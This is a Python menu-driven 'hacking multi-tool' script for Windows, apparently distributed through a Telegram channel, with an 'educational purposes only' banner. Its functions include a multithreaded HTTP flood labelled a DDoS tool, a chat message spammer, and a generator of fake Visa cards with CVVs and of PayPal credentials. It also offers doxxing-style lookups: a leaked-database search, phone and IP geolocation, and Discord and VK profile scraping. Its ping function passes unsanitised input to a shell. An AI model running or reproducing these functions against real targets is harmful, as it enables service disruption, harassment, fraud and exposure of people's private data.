import time
import os, time, pyperclip
from pystyle import Colorate, Center, Anime
from settings import color_cfg, menu
from colorama import Fore

main_color = color_cfg.MAIN_APP_COLOR

os.system("title t.me/AnonimTOfficial & cls")

Anime.Fade(
        Center.Center(menu.intro),
        main_color,
        Colorate.Vertical,
        interval=0.045,
        enter=True,
)

print(Fore.RED + "THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSES, DONT USE IT TO DO SOMETHING ILLEGAL!")
time.sleep(1.5)
os.system("cls")

def phone_scraper():
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone, PhoneNumberType
    from pystyle import Colorate

    def get_phone_number_info(phone_number):
        try:
            parsed_number = phonenumbers.parse(phone_number)

            region = geocoder.description_for_number(parsed_number, 'en')
            carrier_name = carrier.name_for_number(parsed_number, 'en')
            time_zones = timezone.time_zones_for_number(parsed_number)
            is_valid = phonenumbers.is_valid_number(parsed_number)
            is_possible = phonenumbers.is_possible_number(parsed_number)
            number_type = phonenumbers.number_type(parsed_number)
            number_type_description = {
                PhoneNumberType.FIXED_LINE: "Fixed line",
                PhoneNumberType.MOBILE: "Mobile",
                PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed line or mobile",
                PhoneNumberType.TOLL_FREE: "Toll free",
                PhoneNumberType.PREMIUM_RATE: "Premium rate",
                PhoneNumberType.SHARED_COST: "Shared cost",
                PhoneNumberType.VOIP: "VoIP",
                PhoneNumberType.PERSONAL_NUMBER: "Personal number",
                PhoneNumberType.PAGER: "Pager",
                PhoneNumberType.UAN: "UAN",
                PhoneNumberType.VOICEMAIL: "Voicemail",
                PhoneNumberType.UNKNOWN: "Unknown"
            }.get(number_type, "Unknown")

            country_code = parsed_number.country_code
            national_number = parsed_number.national_number
            
            telegram = f"https://t.me/{phone_number}"
            viber = f"https://viber.click/{phone_number}"
            whatsapp = f"https://wa.me/{phone_number}"
            
            info = {
                '[+] Region': region,
                '[+] Carrier': carrier_name,
                '[+] Time Zones': ', '.join(time_zones),
                '[+] Valid': is_valid,
                '[+] Possible': is_possible,
                '[+] Number Type': number_type_description,
                '[+] Country Code': country_code,
                '[+] National Number': national_number,
                '[+] Telegram': telegram,
                '[+] Viber': viber,
                '[+] Whatsapp': whatsapp
            }

            return info

        except phonenumbers.NumberParseException:
            return "[+] Invalid phone number format"

    def main():
        print(Colorate.Horizontal(main_color, '[+] Phone Info'))

        phone_number = input(Colorate.Horizontal(main_color, "[+] Please enter a phone number (with country code, e.g., +1234567890): "))
        info = get_phone_number_info(phone_number)

        if isinstance(info, dict):
            print(Colorate.Horizontal(main_color, "[+] Phone Number Information:"))
            for key, value in info.items():
                print(Colorate.Horizontal(main_color, f"{key}: {value}"))
        else:
            print(Colorate.Horizontal(main_color, info))

    if __name__ == "__main__":
        main()

def IpLookupFunction():
    import json
    from urllib.request import urlopen
    import requests
    from pyfiglet import Figlet
    import folium

    def get_info_by_ip(ip="127.0.0.1"):
        try:
            response_ip_api = requests.get(url=f"http://ip-api.com/json/{ip}").json()
            data_ip_api = {
                "[IP]": response_ip_api.get("query"),
                "[Int prov]": response_ip_api.get("isp"),
                "[Org]": response_ip_api.get("org"),
                "[Country]": response_ip_api.get("country"),
                "[Region Name]": response_ip_api.get("regionName"),
                "[City]": response_ip_api.get("city"),
                "[ZIP]": response_ip_api.get("zip"),
                "[Lat]": response_ip_api.get("lat"),
                "[Lon]": response_ip_api.get("lon"),
            }
            print("Data from ip-api:")
            for k, v in data_ip_api.items():
                print(f"{k} : {v}")

            area = folium.Map(location=[response_ip_api.get("lat"), response_ip_api.get("lon")])
            area.save(f'{response_ip_api.get("query")}_{response_ip_api.get("city")}.html')

            response_ipwhois = urlopen("http://ipwho.is/" + ip + "?lang=ru")
            ipwhois = json.load(response_ipwhois)

            print("\nData from ipwhois:")
            print("[+] Selected IP:", [ip])
            print("[+] IP Type:", "{0}".format(ipwhois["type"]))
            print("[+] Success:", "{0}".format(ipwhois["success"]))
            print("[+] Continent:", "{0} {1}".format(ipwhois["continent"], ipwhois["continent_code"]))
            print("[+] Country:", "{0} {1}".format(ipwhois["country"], ipwhois["country_code"]))
            print("[+] Neighboring countries:", "{0}".format(ipwhois["borders"]))
            print("[+] Capital:", "{0}".format(ipwhois["capital"]))
            print("[+] Region:", "{0}".format(ipwhois["region"]))
            print("[+] Region Code:", "{0}".format(ipwhois["region_code"]))
            print("[+] City:", "{0}".format(ipwhois["city"]))
            print("[+] Approximate location:")
            print("[+] Latitude:", "{0}".format(ipwhois["latitude"]))
            print("[+] Longitude:", "{0}".format(ipwhois["longitude"]))
            print("[+] Country Calling Code:", "{0}".format(ipwhois["calling_code"]))
            print("[+] Provider:", "{0}".format(ipwhois["connection"]["isp"]))
            print("[+] UTC Timezone:", "{0}".format(ipwhois["timezone"]["utc"]))
            print("[+] Current Date and Time:", "{0}".format(ipwhois["timezone"]["current_time"]))

        except requests.exceptions.ConnectionError:
            print("[!] Please check your connection!")

    def main():
        preview_text = Figlet(font="slant")
        print(preview_text.renderText("IP LOOKUP"))
        print("Please enter a target IP ↓")
        ip = input()
        get_info_by_ip(ip=ip)

    if __name__ == "__main__":
        main()

def WebParserFunction():
    import requests
    from bs4 import BeautifulSoup

    try:
        def web_parser(url):
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup

        url = input(Colorate.Horizontal(main_color, '[+] Enter Website URL ---->    '))
        parsed_data = web_parser(url)

        with open('parsed.html', 'w', encoding='utf-8') as file:
            file.write(parsed_data.prettify())

        print(Colorate.Horizontal(main_color, ("[+] HTML content saved to parsed.html")))
    except Exception as e:
        print(Colorate.Horizontal(main_color, f'[+] Error: {e}'))
        time.sleep(2)

def RandomHumanGeneratorFunction():
    from faker import Faker
    from colorama import Fore, Style
    from colorama import init

    init(autoreset=True)

    fake = Faker()

    name = fake.name()
    address = fake.address()
    phone_number = fake.phone_number()
    email = fake.email()
    card_number = fake.credit_card_number()
    card_expiry = fake.credit_card_expire()
    card_provider = fake.credit_card_provider()
    age = fake.random_int(min=18, max=80)

    print(Fore.GREEN + '[+] Name: ' + Fore.RESET + name)
    print(Fore.GREEN + '[+] Address: ' + Fore.RESET + address)
    print(Fore.GREEN + '[+] Phone Number: ' + Fore.RESET + phone_number)
    print(Fore.GREEN + '[+] Email: ' + Fore.RESET + email)
    print(Fore.GREEN + '[+] Card Number: ' + Fore.RESET + card_number)
    print(Fore.GREEN + '[+] Card Expiry: ' + Fore.RESET + card_expiry)
    print(Fore.GREEN + '[+] Card Provider: ' + Fore.RESET + card_provider)
    print(Fore.GREEN + '[+] Age: ' + Fore.RESET + str(age))

def Base64Function():
    import base64
    from pystyle import Colorate, Colors

    def main():
        print(Colorate.Horizontal(main_color, "[+] Choose encoding/decoding method:"))
        print(Colorate.Horizontal(main_color, "    1. Base64"))
        print(Colorate.Horizontal(main_color, "    2. Base32"))
        print(Colorate.Horizontal(main_color, "    3. Base16"))
        method = input(Colorate.Horizontal(main_color, '[+] Method ---->    '))

        print(Colorate.Horizontal(main_color, '[+] Choose action:'))
        print(Colorate.Horizontal(main_color, '    1. Encode'))
        print(Colorate.Horizontal(main_color, '    2. Decode'))
        action = input(Colorate.Horizontal(main_color, '[+] Action ---->    '))

        text = input(Colorate.Horizontal(main_color, '[+] Enter text ---->    '))

        try:
            if method == '1':
                if action == '1':
                    result = base64.b64encode(text.encode()).decode()
                elif action == '2':
                    result = base64.b64decode(text.encode()).decode()
                else:
                    print(Colorate.Horizontal(main_color, '[!] Invalid action'))
                    return
            elif method == '2':
                if action == '1':
                    result = base64.b32encode(text.encode()).decode()
                elif action == '2':
                    result = base64.b32decode(text.encode()).decode()
                else:
                    print(Colorate.Horizontal(main_color, '[!] Invalid action'))
                    return
            elif method == '3':
                if action == '1':
                    result = base64.b16encode(text.encode()).decode()
                elif action == '2':
                    result = base64.b16decode(text.encode()).decode()
                else:
                    print(Colorate.Horizontal(main_color, '[!] Invalid action'))
                    return
            else:
                print(Colorate.Horizontal(main_color, '[!] Invalid method'))
                return

            print(Colorate.Horizontal(main_color, f'[+] Result: {result}'))
            pyperclip.copy(result)
        except Exception as e:
            print(Colorate.Horizontal(main_color, f'[!] Error: {e}'))

    if __name__ == "__main__":
        main()

def WebDDOSERFunction():
    import requests
    from pystyle import Colorate, Colors, Center
    from colorama import Fore
    import threading
    import time

    print(Colorate.Horizontal(main_color, '[+] Starting DDoS tool'))

    target = input(Colorate.Horizontal(main_color, '[+] Enter the target URL --->   '))
    num_threads = int(input(Colorate.Horizontal(main_color, '[+] Enter the number of threads --->   ')))

    def ddos(target):
        while True:
            try:
                response = requests.get(target)
                print(Colorate.Horizontal(main_color, f'[+] Sent request to {target} - Status Code: {response.status_code}'))
            except requests.exceptions.RequestException as e:
                print(Colorate.Horizontal(main_color, f'[+] Error: {e}'))

    print(Colorate.Horizontal(main_color, '[+] Initializing threads...'))

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def MessageSpammerFunction():
    import pyautogui
    import time

    print(Colorate.Horizontal(main_color, ("[+] Open your chat to spam")))
    time.sleep(5)
    while True:
        try:
            f = open("utils\\spam.txt", "r")
            for line in f:
                pyautogui.typewrite(line, interval=0)
                pyautogui.press("enter")
        except Exception as e:
            print(Colorate.Horizontal(main_color, (f"[+] Error: {e}"),))

def RandomCardGeneratorFunction():
    import random
    from pystyle import Colorate, Colors, Center
    from colorama import Fore
    import os

    def generate_visa():
        card_number = f"4{''.join([str(random.randint(0, 9)) for _ in range(15)])}"
        expiry_date = f"{random.randint(1, 12):02d}/{random.randint(22, 30)}"
        cvv = f"{random.randint(100, 999)}"
        cardholder_name = f"{random.choice(['John', 'Jane', 'Alex', 'Chris', 'Sam'])} {random.choice(['Doe', 'Smith', 'Johnson', 'Lee', 'Brown'])}"
        return card_number, expiry_date, cvv, cardholder_name

    def generate_paypal():
        email = f"{''.join([random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(12)])}@example.com"
        password = f"{''.join([random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()') for _ in range(16)])}"
        balance = f"${random.randint(0, 10000)}.{random.randint(0, 99):02d}"
        creation_date = f"{random.randint(1, 12):02d}/{random.randint(1, 28):02d}/{random.randint(2000, 2021)}"
        return email, password, balance, creation_date

    def generate_qiwi():
        return f"+7{''.join([str(random.randint(0, 9)) for _ in range(10)])}"

    def main():
        while True:
            os.system("cls")
            print(Colorate.Horizontal(main_color, '[1] Generate Visa Card'))
            print(Colorate.Horizontal(main_color, '[2] Generate PayPal Account'))
            print(Colorate.Horizontal(main_color, '[3] Generate Qiwi Account'))
            print(Colorate.Horizontal(main_color, '[4] Back To Menu'))
            
            choice = input(Colorate.Horizontal(main_color, '[+] Your choice --->   '))
            
            if choice == '1':
                card_number, expiry_date, cvv, cardholder_name = generate_visa()
                print(Colorate.Horizontal(main_color, f'[+] Generated Visa Card: {card_number}'))
                print(Colorate.Horizontal(main_color, f'[+] Expiry Date: {expiry_date}'))
                print(Colorate.Horizontal(main_color, f'[+] CVV: {cvv}'))
                print(Colorate.Horizontal(main_color, f'[+] Cardholder Name: {cardholder_name}'))
                input()
            elif choice == '2':
                email, password, balance, creation_date = generate_paypal()
                print(Colorate.Horizontal(main_color, f'[+] Generated PayPal Account: {email}'))
                print(Colorate.Horizontal(main_color, f'[+] Password: {password}'))
                print(Colorate.Horizontal(main_color, f'[+] Balance: {balance}'))
                print(Colorate.Horizontal(main_color, f'[+] Creation Date: {creation_date}'))
                input()
            elif choice == '3':
                print(Colorate.Horizontal(main_color, f'[+] Generated Qiwi Account: {generate_qiwi()}'))
                input()
            elif choice == '4':
                AnonimApp()
            else:
                print(Colorate.Horizontal(main_color, '[+] Invalid choice, please try again'))
                input()

    if __name__ == "__main__":
        main()

def PasswordGeneratorFunction():
    import random
    import string
    from colorama import Fore, Style

    def PasswordGeneratorFunction():
        def RalPasswordGenerator(length):
            try:
                with open('utils/words.txt', 'r') as file:
                    words = file.read().splitlines()
            except FileNotFoundError:
                print(Fore.RED + "Error: 'utils/words.txt' not found." + Style.RESET_ALL)
                return ""

            num_words = length // 3
            num_numbers = length // 2
            num_special_chars = length - num_words - num_numbers

            words_part = ''.join(random.sample(words, num_words))
            numbers = ''.join(random.choices(string.digits, k=num_numbers))
            special_chars = ''.join(random.choices(string.punctuation, k=num_special_chars))

            password = words_part + numbers + special_chars
            password_list = list(password)
            random.shuffle(password_list)
            return ''.join(password_list)

        try:
            length_input = int(input(Fore.GREEN + '[+] Enter length --->   ' + Style.RESET_ALL))
            if length_input < 6:
                print(Fore.RED + "Error: Password length should be at least 6 characters." + Style.RESET_ALL)
                return
        except ValueError:
            print(Fore.RED + "Error: Please enter a valid integer." + Style.RESET_ALL)
            return

        password = RalPasswordGenerator(length_input)
        if password:
            print(Fore.GREEN + f'[+] Your password: {password}' + Style.RESET_ALL)
            
    PasswordGeneratorFunction()

def DiscordUserScrapFunction():
    import requests
    import time

    TOKEN = input(Colorate.Horizontal(main_color, "[+] Enter the token: "))

    def get_user_info(user_id):
        url = f'https://discord.com/api/v10/users/{user_id}'
        headers = {
            'Authorization': f'Bot {TOKEN}'
        }

        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            user_data = response.json()
            creation_time = get_creation_time_from_snowflake(user_data["id"])
            print(Colorate.Horizontal(main_color, f'[+] Account created at: {creation_time}'))
            print(Colorate.Horizontal(main_color, f'[+] User ID: {user_data["id"]}'))
            print(Colorate.Horizontal(main_color, f'[+] Username: {user_data["username"]}#{user_data["discriminator"]}'))
        else:
            print(f'Failed to fetch user info: {response.status_code} - {response.text}')
            print(Colorate.Horizontal(main_color, f'[+] Failed to fetch user info: {response.status_code} - {response.text}'))

    def get_creation_time_from_snowflake(snowflake_id):
        discord_epoch = 1420070400000
        timestamp = ((int(snowflake_id) >> 22) + discord_epoch) / 1000
        return time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(timestamp))

    if __name__ == "__main__":
        user_id = input(Colorate.Horizontal(main_color, "[+] Enter the user ID: "))
        get_user_info(user_id)

def PingerFunction():
    main_pinger_input = input(Colorate.Horizontal(main_color, ("[+] Enter website to ping ---->    ")))
    os.system(f"ping {main_pinger_input}")

def ProxyGeneratorFunction():

    def generate_proxy_with_auth():
        import requests
        from colorama import init, Fore, Style

        init()

        def get_proxy():
            proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

            try:
                response = requests.get(proxy_api_url)
                if response.status_code == 200:
                    proxy_list = response.text.strip().split("\r\n")
                    return proxy_list
                else:
                    print(
                        f"{Fore.RED}Failed to fetch proxy list. Status code: {response.status_code}"
                    )
            except Exception as e:
                print(
                    f"{Fore.RED}Error fetching proxy list: {e}"
                )

            return None

        proxies = get_proxy()
        if proxies:
            print(f"{Style.BRIGHT}{Fore.GREEN}Proxy list:")
            for proxy in proxies:
                print(f"{Style.BRIGHT}{Fore.GREEN}{proxy}")
        else:
            print(
                f"{Fore.RED}No proxy list available."
            )
            
    if __name__ == "__main__":
        generate_proxy_with_auth()

def VKParser():
    import requests
    from bs4 import BeautifulSoup

    def get_vk_profile(user_id):
        url = f"https://vk.com/{user_id}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        
        response = requests.get(url, headers=headers)
        
        if response.status_code != 200:
            raise Exception(f"Failed to load page {url}")

        soup = BeautifulSoup(response.text, 'html.parser')

        profile_data = {}

        name_tag = soup.find('h1', {'class': 'page_name'})
        if name_tag:
            profile_data['name'] = name_tag.text.strip()

        photo_tag = soup.find('img', {'class': 'page_avatar_img'})
        if photo_tag:
            profile_data['photo_url'] = photo_tag['src']

        status_tag = soup.find('div', {'class': 'pp_status'})
        if status_tag:
            profile_data['status'] = status_tag.text.strip()

        return profile_data

    def save_to_html(profile_data, filename='parsed_vk.html'):
        html_content = f"""
        <html>
        <head>
            <title>VK Profile Data</title>
        </head>
        <body>
            <h1>{profile_data.get('name', 'N/A')}</h1>
            <img src="{profile_data.get('photo_url', '')}" alt="Profile Photo">
            <p>Status: {profile_data.get('status', 'N/A')}</p>
        </body>
        </html>
        """
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(html_content)

    if __name__ == "__main__":
        user_id = input(Colorate.Horizontal(main_color, '[+] Enter Username or ID --->   '))
        profile_data = get_vk_profile(user_id)
        save_to_html(profile_data)
        print(Colorate.Horizontal(main_color, f"[+] Profile data saved to parsed_vk.html"))

def SearchFromCsvFunction():
    import pandas as pd
    import os
    from pystyle import Colorate, Colors, Center
    from colorama import Fore

    def load_csv(file_path):
        if not os.path.exists(file_path):
            print(Colorate.Horizontal(main_color, '[+] File path does not exist.'))
            return None
        try:
            data = pd.read_csv(file_path)
            return data
        except Exception as e:
            print(Colorate.Horizontal(main_color, f'[+] An error occurred: {e}'))
            return None

    def search_csv(data, search_term):
        """Search the CSV data for the specified term."""
        results = data[data.apply(lambda row: row.astype(str).str.contains(search_term, case=False).any(), axis=1)]
        return results

    def display_results(results):
        """Display the search results."""
        if results.empty:
            print(Colorate.Horizontal(main_color, '[+] No results found.'))
        else:
            print(Colorate.Horizontal(main_color, f'[+] Results found:\n{results}'))

    def main():
        file_path = input(Colorate.Horizontal(main_color, '[+] Please enter the path to the file --->   '))
        data = load_csv(file_path)
        if data is None:
            return
        
        search_term = input(Colorate.Horizontal(main_color, '[+] Please enter the search term --->   '))
        results = search_csv(data, search_term)
        display_results(results)

    if __name__ == "__main__":
        main()

def PortCheckerFunction():
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip_input = input(Colorate.Horizontal(main_color, '[+] Enter IP --->   '))
    port_input = int(input(Colorate.Horizontal(main_color, '[+] Enter PORT --->   ')))
    
    try:
        result = sock.connect_ex((ip_input, port_input))
        
    except Exception as e:
        print(Colorate.Horizontal(main_color, (f"[+] Error: {e}")))
        time.sleep(2)
        return
    
    if result == 0:
        print(Colorate.Horizontal(main_color, (f"[+] Port is open.")))
        
    else:
        print(Colorate.Horizontal(main_color, (f"[+] Port is not open.")))
    sock.close()
        
def WIFIPasswordGetter():
    from pystyle import Colorate, Colors, Center
    from colorama import Fore
    import os
    import time
    import subprocess

    def main():

        def print_colored(text):
            print(Colorate.Horizontal(main_color, text))

        def input_colored(prompt):
            return input(Colorate.Horizontal(main_color, prompt))

        if os.name == "nt":
            print_colored('[+] Windows system detected..! Doing a netsh scan...')
            time.sleep(1)
            try:
                subprocess.run(["netsh", "wlan", "show", "networks"], check=True)
            except subprocess.CalledProcessError as e:
                print_colored(f'[+] Error : {e.returncode}')
        else:
            print_colored('[+] This script only supports Windows OS.')

    if __name__ == "__main__":
        main()

def INDevFunc():
    print(Colorate.Horizontal(main_color, "[+] IN DEV..."))
    
def MacAddressSearchFunc():
    import requests

    def get_mac_info(mac_address):
        url = f'https://api.macvendors.com/{mac_address}'
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return None

    if __name__ == "__main__":
        mac_address = input(Colorate.Horizontal(main_color, f"[+] Enter the MAC address -->   "))
        info = get_mac_info(mac_address)
        if info:
            print(Colorate.Horizontal(main_color, f"[+] Information for MAC address {mac_address}:\n{info}"))
        else:
            print(Colorate.Horizontal(main_color, f"[+] No Info Found : ("))

def SearchV2Func():
    import requests
    from colorama import Fore, init

    init(autoreset=True)

    def main():
        phone = input(Fore.LIGHTCYAN_EX + "Please enter info to search --->  ")
        token_inp = input(Fore.LIGHTCYAN_EX + "Please enter your leak osint api --->  ")
        print(Fore.LIGHTCYAN_EX + "╔════════════════════════")

        response = requests.post(
            "https://server.leakosint.com/",
            json={
                "token": token_inp,
                "request": phone,
                "limit": 1100,
                "lang": "ru"
            }
        )

        if response.status_code != 200:
            print(Fore.RED + "Ошибка: Не удалось подключиться к серверу")
            print(Fore.LIGHTCYAN_EX + "════════════════════════╝")
            return

        data = response.json()

        if "List" in data:
            for database, info in data['List'].items():
                if "No results found" in database:
                    print(Fore.LIGHTCYAN_EX + "\n[!] Ничего не найдено\n")
                    break
                for record in info['Data']:
                    for key, value in record.items():
                        print(Fore.LIGHTCYAN_EX + f"\n║ [+] {key} -> ")
                        print(Fore.LIGHTCYAN_EX + "║ " + value)
        else:
            print(Fore.RED + "Ошибка: Не удалось получить данные")

        print(Fore.LIGHTCYAN_EX + "════════════════════════╝")

    if __name__ == "__main__":
        main()

def AnonimApp():
    while True:
        main_color = color_cfg.MAIN_APP_COLOR

        def MainTool():
            print(Colorate.Horizontal(main_color, Center.XCenter(menu.big_text)))
            print(Colorate.Horizontal(main_color, Center.XCenter(menu.choice_menu)))
            print()

            choice = input(Colorate.Horizontal(main_color, Center.XCenter("[+] Enter The Function ---->    ")))

            if choice == "1":
                phone_scraper()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "2":
                IpLookupFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "3":
                SearchV2Func()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "4":
                MacAddressSearchFunc()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "5":
                SearchFromCsvFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "6":
                DiscordUserScrapFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "7":
                VKParser()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "8":
                WebParserFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()
                
            elif choice == "9":
                RandomHumanGeneratorFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "10":
                RandomCardGeneratorFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "11":
                PasswordGeneratorFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "12":
                ProxyGeneratorFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "13":
                Base64Function()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "14":
                WebDDOSERFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "15":
                WIFIPasswordGetter()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "16":
                MessageSpammerFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "17":
                PingerFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "18":
                PortCheckerFunction()
                input(Colorate.Horizontal(main_color, Center.XCenter("[+] Press enter to continue ---->    ")))
                AnonimApp()

            elif choice == "EX":
                import pyautogui
                print(Fore.RED + "EXITING...")
                time.sleep(1.3)
                pyautogui.hotkey('alt', 'f4')

            else:
                print(Colorate.Horizontal(main_color, ("[+] Error: Please enter valid choice...")))
                time.sleep(2.5)
        MainTool()

if __name__ == "__main__":
    AnonimApp()
